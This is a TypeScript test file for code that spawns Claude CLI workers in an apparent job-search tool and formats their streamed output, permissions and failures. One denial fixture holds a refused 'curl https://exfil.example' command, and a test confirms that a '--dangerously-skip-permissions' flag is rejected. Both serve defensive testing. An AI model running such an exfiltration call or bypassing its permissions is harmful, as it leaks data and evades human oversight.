import { test } from 'node:test'
import assert from 'node:assert/strict'
import {
  NON_INTERACTIVE_SUFFIX,
  MODEL_PINS,
  modelArg,
  claudeArgs,
  humanizeJsonlChunk,
  humanizeJsonlLine,
  formatToolUse,
  formatResultStats,
  formatTokens,
  formatDuration,
  truncate,
  isAuthFailureText,
  diagnoseFailureText,
  WORKER_FLAG,
  WORKER_KINDS,
  PERMISSION_BLOCKED_PREFIX,
  PERMISSION_REFUSED_PREFIX,
  DONE_WITH_WARNINGS,
  permissionDenials,
  reportedStatus,
  runResultOf,
  parseRunResult,
  decideFinishStatus,
} from '@/lib/spawnFormat'

// The capability table main expands the marker with (scripts/lib/
// worker-capabilities.mjs). A variable path keeps tsc from resolving the .mjs.
const CAPS_PATH = '../../../scripts/lib/worker-capabilities.mjs'
interface CapsModule {
  WORKER_KINDS: string[]
  expandWorkerArgs: (args: string[], opts?: { tmpdirs?: string[] }) => string[]
}
const loadCaps = () => import(CAPS_PATH) as Promise<CapsModule>

// Compact JSONL event builders so each test reads as the event it exercises,
// not as a wall of JSON.
const ev = (o: object) => JSON.stringify(o)
const assistant = (...content: object[]) => ev({ type: 'assistant', message: { content } })

// ─── claudeArgs ──────────────────────────────────────────────────────────────

test('claudeArgs names the worker kind and appends the batch suffix', () => {
  const args = claudeArgs('/career-ops scan', 'sonnet', 'scan')
  assert.deepEqual(args, [
    WORKER_FLAG, 'scan',
    '--output-format', 'stream-json',
    '--verbose',
    '--model', 'sonnet',
    '-p',
    '/career-ops scan' + NON_INTERACTIVE_SUFFIX,
  ])
  assert.ok(!args.some(a => a.includes('skip-permissions')))
})

test('every frontend worker kind is a kind of the capability table', async () => {
  const caps = await loadCaps()
  assert.deepEqual([...WORKER_KINDS].sort(), [...caps.WORKER_KINDS].sort())
})

test('main expands each kind into its derived flags (dontAsk for unattended kinds, acceptEdits for chat)', async () => {
  const caps = await loadCaps()
  for (const kind of WORKER_KINDS) {
    const argv = caps.expandWorkerArgs(claudeArgs('/x', 'sonnet', kind))
    assert.deepEqual(argv.slice(0, 2), ['--permission-mode', kind === 'chat' ? 'acceptEdits' : 'dontAsk'], kind)
    assert.ok(argv.includes('--allowedTools') && argv.includes('--disallowedTools'), kind)
    assert.ok(!argv.includes(WORKER_FLAG), kind)
    assert.equal(argv.at(-1), '/x' + NON_INTERACTIVE_SUFFIX, kind)
  }
  // The Full scan: scan.mjs and the pipeline inbox, nothing in user/ beyond portals.
  const scan = caps.expandWorkerArgs(claudeArgs('/career-ops scan', 'sonnet', 'scan'))
  const allowed = scan.slice(scan.indexOf('--allowedTools'), scan.indexOf('--disallowedTools'))
  const denied = scan.slice(scan.indexOf('--disallowedTools'))
  assert.ok(allowed.includes('Bash(node scripts/scan.mjs:*)'))
  assert.ok(allowed.includes('Edit(./data/pipeline.md)'))
  assert.ok(allowed.includes('Edit(./user/portals.yml)'))
  assert.ok(!allowed.includes('Edit(./user/cv.md)') && denied.includes('Edit(./user/cv.md)'))
})

test('a renderer argv cannot widen its own permissions', async () => {
  const caps = await loadCaps()
  assert.throws(() => caps.expandWorkerArgs(['--dangerously-skip-permissions', '-p', 'x']))
  assert.throws(() => caps.expandWorkerArgs([...claudeArgs('/x', 'sonnet', 'chat'), '--allowedTools', 'Bash']))
})

// Auto-latest is the default: no tier is pinned, so every spawn hands the CLI
// the bare alias and gets the newest model in that tier.
test('MODEL_PINS is empty by default — every tier tracks the latest model', () => {
  assert.deepEqual(MODEL_PINS, {})
})

test('claudeArgs omits --model entirely when no model is given', () => {
  const args = claudeArgs('/career-ops pipeline', undefined, 'eval-app')
  assert.equal(args.includes('--model'), false)
  // -p is the second-to-last token; the prompt is last.
  assert.equal(args[args.length - 2], '-p')
  assert.ok(args[args.length - 1].startsWith('/career-ops pipeline'))
  assert.ok(args[args.length - 1].endsWith(NON_INTERACTIVE_SUFFIX))
})

test('claudeArgs passes each tier alias through modelArg', () => {
  for (const m of ['sonnet', 'opus', 'haiku'] as const) {
    const args = claudeArgs('/x', m, 'chat')
    assert.equal(args[args.indexOf('--model') + 1], modelArg(m))
    assert.equal(modelArg(m), m)
  }
})

test('modelArg honours a pin when one is set', () => {
  MODEL_PINS.opus = 'claude-opus-test-pin'
  try {
    assert.equal(modelArg('opus'), 'claude-opus-test-pin')
    assert.equal(modelArg('sonnet'), 'sonnet')
  } finally {
    delete MODEL_PINS.opus
  }
})

// ─── truncate ────────────────────────────────────────────────────────────────

test('truncate leaves short strings untouched and ellipsizes long ones to n chars', () => {
  assert.equal(truncate('short', 80), 'short')
  assert.equal(truncate('x'.repeat(80), 80), 'x'.repeat(80))   // exactly n: untouched
  const out = truncate('x'.repeat(200), 80)
  assert.equal(out.length, 80)
  assert.equal(out.endsWith('…'), true)
  assert.equal(out, 'x'.repeat(79) + '…')
})

// ─── formatToolUse ───────────────────────────────────────────────────────────

test('formatToolUse renders file tools as "→ Name path"', () => {
  assert.equal(formatToolUse({ type: 'tool_use', name: 'Read', input: { file_path: '/a/b.md' } }), '→ Read /a/b.md')
  assert.equal(formatToolUse({ type: 'tool_use', name: 'Edit', input: { path: '/c.ts' } }), '→ Edit /c.ts')
  // No path → just the tool name, no trailing space.
  assert.equal(formatToolUse({ type: 'tool_use', name: 'Write', input: {} }), '→ Write')
})

test('formatToolUse renders Bash with a "Bash:" prefix and truncates the command', () => {
  assert.equal(formatToolUse({ type: 'tool_use', name: 'Bash', input: { command: 'ls -la' } }), '→ Bash: ls -la')
  const long = formatToolUse({ type: 'tool_use', name: 'Bash', input: { command: 'echo ' + 'a'.repeat(200) } })
  assert.ok(long!.startsWith('→ Bash: '))
  assert.ok(long!.endsWith('…'))
})

test('formatToolUse renders Grep/Glob/WebFetch/WebSearch from their primary input', () => {
  assert.equal(formatToolUse({ type: 'tool_use', name: 'Grep', input: { pattern: 'TODO' } }), '→ Grep TODO')
  assert.equal(formatToolUse({ type: 'tool_use', name: 'Glob', input: { path: 'src/**' } }), '→ Glob src/**')
  assert.equal(formatToolUse({ type: 'tool_use', name: 'WebFetch', input: { url: 'https://x.com' } }), '→ WebFetch https://x.com')
  assert.equal(formatToolUse({ type: 'tool_use', name: 'WebSearch', input: { query: 'job listings' } }), '→ WebSearch job listings')
})

test('formatToolUse drops TodoWrite entirely (internal scheduling)', () => {
  assert.equal(formatToolUse({ type: 'tool_use', name: 'TodoWrite', input: { todos: [] } }), null)
})

test('formatToolUse falls back to name + first stringy input for unknown tools', () => {
  // MCP/browser/agent tools: show the first string value if present.
  assert.equal(
    formatToolUse({ type: 'tool_use', name: 'mcp__browser__navigate', input: { count: 3, url: 'https://job.example' } }),
    '→ mcp__browser__navigate https://job.example',
  )
  // No stringy input → bare name. Missing name → "Tool".
  assert.equal(formatToolUse({ type: 'tool_use', name: 'SomeTool', input: { n: 1 } }), '→ SomeTool')
  assert.equal(formatToolUse({ type: 'tool_use', input: {} }), '→ Tool')
})

// ─── humanizeJsonlLine ───────────────────────────────────────────────────────

test('humanizeJsonlLine maps the result event to a capstone', () => {
  assert.equal(humanizeJsonlLine(ev({ type: 'result', subtype: 'success' })), '✓ Done')
  assert.equal(humanizeJsonlLine(ev({ type: 'result', subtype: 'error_during_execution' })), '× error_during_execution')
  assert.equal(humanizeJsonlLine(ev({ type: 'result' })), '× error')  // missing subtype → "error"
})

test('result capstone appends duration/turns/token stats when the event carries them', () => {
  assert.equal(
    humanizeJsonlLine(ev({
      type: 'result', subtype: 'success', duration_ms: 184_000, num_turns: 41,
      usage: { input_tokens: 1200, cache_creation_input_tokens: 45_000, cache_read_input_tokens: 310_000, output_tokens: 5400 },
    })),
    '✓ Done — 3m 04s · 41 turns · 356.2k in (87% cached) / 5.4k out',
  )
  // Failure capstones get the same tail.
  assert.equal(
    humanizeJsonlLine(ev({ type: 'result', subtype: 'error_during_execution', duration_ms: 9000 })),
    '× error_during_execution — 9s',
  )
})

test('formatResultStats returns null when the event has no stats (older CLI)', () => {
  assert.equal(formatResultStats({ type: 'result', subtype: 'success' }), null)
  assert.equal(formatResultStats({ type: 'result', usage: {} }), null)
})

test('formatResultStats omits the cached tag when nothing was read from cache', () => {
  assert.equal(
    formatResultStats({ usage: { input_tokens: 900, output_tokens: 100 } }),
    '900 in / 100 out',
  )
})

test('formatTokens and formatDuration round the way the panel expects', () => {
  assert.equal(formatTokens(999), '999')
  assert.equal(formatTokens(1_500), '1.5k')
  assert.equal(formatTokens(2_340_000), '2.3M')
  assert.equal(formatDuration(45_000), '45s')
  assert.equal(formatDuration(60_000), '1m 00s')
  assert.equal(formatDuration(184_223), '3m 04s')
})

test('humanizeJsonlLine drops system events and tool_result (user) echoes', () => {
  assert.equal(humanizeJsonlLine(ev({ type: 'system', subtype: 'init' })), null)
  assert.equal(humanizeJsonlLine(ev({ type: 'user', message: { content: [{ type: 'tool_result' }] } })), null)
  assert.equal(humanizeJsonlLine(ev({ type: 'something_unknown' })), null)
})

test('humanizeJsonlLine surfaces assistant prose and tool calls, joined by newline', () => {
  assert.equal(humanizeJsonlLine(assistant({ type: 'text', text: '  Scanning portals  ' })), 'Scanning portals')
  assert.equal(
    humanizeJsonlLine(assistant({ type: 'text', text: 'Reading CV' }, { type: 'tool_use', name: 'Read', input: { file_path: 'user/cv.md' } })),
    'Reading CV\n→ Read user/cv.md',
  )
  // Assistant turn with only an empty text block → nothing to show.
  assert.equal(humanizeJsonlLine(assistant({ type: 'text', text: '   ' })), null)
})

test('humanizeJsonlLine surfaces non-JSON lines verbatim (never silently swallowed)', () => {
  assert.equal(humanizeJsonlLine('plain stderr noise'), 'plain stderr noise')
  assert.equal(humanizeJsonlLine('{ not valid json'), '{ not valid json')
})

// ─── humanizeJsonlChunk (the split-line stitching) ───────────────────────────

test('humanizeJsonlChunk emits complete lines and carries the trailing partial', () => {
  const { lines, buffer } = humanizeJsonlChunk('', assistant({ type: 'text', text: 'one' }) + '\n' + '{"type":"resu')
  assert.deepEqual(lines, ['one'])
  assert.equal(buffer, '{"type":"resu')   // incomplete final line held back
})

test('humanizeJsonlChunk stitches a line split across two chunks', () => {
  const full = ev({ type: 'result', subtype: 'success' })
  const a = humanizeJsonlChunk('', full.slice(0, 10))      // no newline yet
  assert.deepEqual(a.lines, [])
  assert.equal(a.buffer, full.slice(0, 10))
  const b = humanizeJsonlChunk(a.buffer, full.slice(10) + '\n')
  assert.deepEqual(b.lines, ['✓ Done'])
  assert.equal(b.buffer, '')
})

test('humanizeJsonlChunk skips blank lines and flattens multi-line events', () => {
  const chunk =
    assistant({ type: 'text', text: 'Step A' }, { type: 'tool_use', name: 'Bash', input: { command: 'node x.mjs' } }) + '\n' +
    '\n' +  // blank line between events
    ev({ type: 'system' }) + '\n'
  const { lines, buffer } = humanizeJsonlChunk('', chunk)
  assert.deepEqual(lines, ['Step A', '→ Bash: node x.mjs'])  // system dropped, blank skipped
  assert.equal(buffer, '')
})

// ─── isAuthFailureText ───────────────────────────────────────────────────────

test('isAuthFailureText matches real auth-death signatures (case-insensitive)', () => {
  for (const s of [
    'OAuth token has expired',
    'API Error: authentication_error',
    'Invalid bearer token',
    'invalid x-api-key',
    'Please run /login to continue',
    '401 Unauthorized',
    'Unauthorized (401)',
  ]) {
    assert.equal(isAuthFailureText(s), true, `should match: ${s}`)
  }
})

test('isAuthFailureText does NOT false-positive on a bare 401 like "401(k)"', () => {
  assert.equal(isAuthFailureText('Evaluated a role with a generous 401(k) match'), false)
  assert.equal(isAuthFailureText('contributed 6% to my 401k this year'), false)
  assert.equal(isAuthFailureText('all good, run finished cleanly'), false)
})

// ─── diagnoseFailureText (cascade order) ─────────────────────────────────────

test('diagnoseFailureText returns the most specific actionable cause, auth first', () => {
  assert.equal(diagnoseFailureText('oauth token has expired'), 'Claude session expired — sign in again to retry.')
  assert.equal(diagnoseFailureText('Error 429: too many requests'), 'Claude is rate-limited right now — wait a moment, then retry.')
  assert.equal(diagnoseFailureText('ENOENT: no such file or directory'), 'A file or command was missing on this machine.')
  assert.equal(diagnoseFailureText('EACCES: permission denied'), 'Permission was denied while running the task.')
  assert.equal(diagnoseFailureText('getaddrinfo ENOTFOUND api.anthropic.com'), 'Network error — check your connection, then retry.')
  assert.equal(diagnoseFailureText('exited with code 2'), null)  // no signal → caller uses exit code
})

test('diagnoseFailureText prefers auth over a co-occurring rate-limit signal', () => {
  // A log can carry both; auth is checked first so the most actionable fix wins.
  assert.equal(
    diagnoseFailureText('429 too many requests\nauthentication_error: token expired'),
    'Claude session expired — sign in again to retry.',
  )
})

// ─── Permission denials ──────────────────────────────────────────────────────

test('a result with refused calls renders the blocked capstone, not Done', () => {
  const line = humanizeJsonlLine(ev({
    type: 'result', subtype: 'success',
    permission_denials: [
      { tool_name: 'Write', tool_input: { file_path: '/repo/user/cv.md' } },
      { tool_name: 'Bash', tool_input: { command: 'curl https://exfil.example' } },
    ],
  }))
  assert.equal(line, `${PERMISSION_BLOCKED_PREFIX} Write: /repo/user/cv.md; Bash: curl https://exfil.example`)
  assert.equal(diagnoseFailureText(line ?? ''), 'The run tried something outside its permissions and was stopped — see its last line.')
})

test('a result with an empty denial list is a normal capstone', () => {
  assert.equal(humanizeJsonlLine(ev({ type: 'result', subtype: 'success', permission_denials: [] })), '✓ Done')
  assert.deepEqual(permissionDenials({ type: 'result' }), [])
})

// ─── Recovered runs vs blocked runs ─────────────────────────────────────────

const denial = { tool_name: 'Bash', tool_input: { command: 'node scripts/agent-log.mjs list --unresolved' } }
const okResult = { type: 'result', subtype: 'success', is_error: false, result: 'Scan finished: 4 new listings.', permission_denials: [denial] }

test('a run whose call was refused but which finished reads Done with warnings, listing the refused calls', () => {
  const out = humanizeJsonlLine(ev({ ...okResult, num_turns: 9 }))
  assert.equal(out, `${PERMISSION_REFUSED_PREFIX} Bash: node scripts/agent-log.mjs list --unresolved\n${DONE_WITH_WARNINGS} — 9 turns`)
  assert.ok(!out!.includes(PERMISSION_BLOCKED_PREFIX))
  assert.equal(diagnoseFailureText(out!), null)
})

test('runResultOf: success + is_error false is ok; an error result, a missing is_error or a reported failure is not', () => {
  assert.deepEqual(runResultOf(okResult), { ok: true, denied: ['Bash: node scripts/agent-log.mjs list --unresolved'] })
  assert.equal(runResultOf({ ...okResult, is_error: true }).ok, false)
  assert.equal(runResultOf({ ...okResult, subtype: 'error_max_turns' }).ok, false)
  assert.equal(runResultOf({ type: 'result', subtype: 'success', permission_denials: [denial] }).ok, false)  // fail closed
  const failed = { ...okResult, result: 'Stopped.\n```json\n{ "status": "failed", "error": "Bash denied" }\n```' }
  assert.equal(runResultOf(failed).ok, false)
  assert.ok(humanizeJsonlLine(ev(failed))!.startsWith(PERMISSION_BLOCKED_PREFIX))
})

test('reportedStatus takes the last status of the final summary, like batch-usage extractReported', () => {
  assert.equal(reportedStatus('{"other":[{"status":"amber"}]} {"status": "completed"}'), 'completed')
  assert.equal(reportedStatus('{"status":"completed"} then {"status":"failed"}'), 'failed')
  assert.equal(reportedStatus('no json here'), null)
  assert.equal(reportedStatus(undefined), null)
})

test('humanizeJsonlChunk hands back the run result from the result event only', () => {
  const r = humanizeJsonlChunk('', ev({ type: 'system' }) + '\n' + ev(okResult) + '\n')
  assert.deepEqual(r.result, { ok: true, denied: ['Bash: node scripts/agent-log.mjs list --unresolved'] })
  assert.equal(humanizeJsonlChunk('', assistant({ type: 'text', text: 'hi' }) + '\n').result, undefined)
  assert.equal(parseRunResult('not json'), null)
  assert.equal(parseRunResult(ev({ type: 'assistant' })), null)
})

test('decideFinishStatus: recovered runs are done with warnings; blocked, failed or erroring runs are errors', () => {
  const claude = (result?: { ok: boolean; denied: string[] }, output: string[] = []) => ({ tool: 'claude', status: 'running', output, result })
  // Recovered: success result, a refused call, exit 0.
  assert.deepEqual(decideFinishStatus(claude({ ok: true, denied: ['Bash: x'] }), 0), { status: 'done', warnings: ['Bash: x'] })
  // Ended in error or reported failure with a refused call: Blocked.
  assert.deepEqual(decideFinishStatus(claude({ ok: false, denied: ['Bash: x'] }), 0), { status: 'error' })
  // Clean run.
  assert.deepEqual(decideFinishStatus(claude({ ok: true, denied: [] }), 0), { status: 'done' })
  // No result event but a Blocked line (older stream): still failed.
  assert.deepEqual(decideFinishStatus(claude(undefined, [`${PERMISSION_BLOCKED_PREFIX} Bash: x`]), 0), { status: 'error' })
  assert.deepEqual(decideFinishStatus(claude(undefined, ['hello']), 0), { status: 'done' })
  // Exit code and kill win over the result.
  assert.deepEqual(decideFinishStatus(claude({ ok: true, denied: ['Bash: x'] }), 1), { status: 'error' })
  assert.deepEqual(decideFinishStatus({ ...claude({ ok: true, denied: [] }), status: 'killed' }, 0), { status: 'killed' })
  // node/shell spawns: exit code only.
  assert.deepEqual(decideFinishStatus({ tool: 'node', status: 'running', output: [`${PERMISSION_BLOCKED_PREFIX} x`] }, 0), { status: 'done' })
})
